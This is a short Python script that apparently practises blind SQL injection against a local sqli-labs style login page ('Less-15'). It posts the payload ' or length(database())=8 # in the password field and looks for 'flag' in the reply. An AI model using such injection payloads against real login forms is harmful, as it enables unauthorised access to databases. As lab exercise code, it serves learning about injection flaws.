import requests

import re
import time
import string

url='http://localhost/Less-15/'

payload="' or length(database())=8 #"

data={
	"uname":"admin",
	"passwd":payload,
	"submit":"Submit"
}

resp=requests.post(url,data=data)
if re.search('flag',resp.text):
	print("boo yeah!")	